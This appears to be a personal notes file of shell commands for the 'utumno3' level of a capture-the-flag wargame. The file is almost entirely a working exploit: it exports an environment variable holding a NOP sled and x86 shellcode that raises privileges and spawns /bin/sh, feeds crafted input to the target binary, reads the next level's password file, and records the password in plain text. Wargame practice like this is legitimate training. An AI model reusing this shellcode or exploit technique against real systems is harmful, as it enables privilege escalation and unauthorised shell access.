
mkdir /tmp/utumno3_ballban
cd /tmp/utumno3_ballban


set args < /tmp/utumno3_ballban/text.txt





python3 /tmp/utumno3_ballban/text.py > text.txt
cat text.txt


export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 1000 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")
/tmp/utumno2_ballban/check_env EGG


/utumno/utumno3 < /tmp/utumno3_ballban/text.txt

# run command with cat
# I have no idea what this does
cat  <(cat /tmp/utumno3_ballban/text.txt) -| /utumno/utumno3

cat /etc/utumno_pass/utumno4
# Password: qHWLExh7C5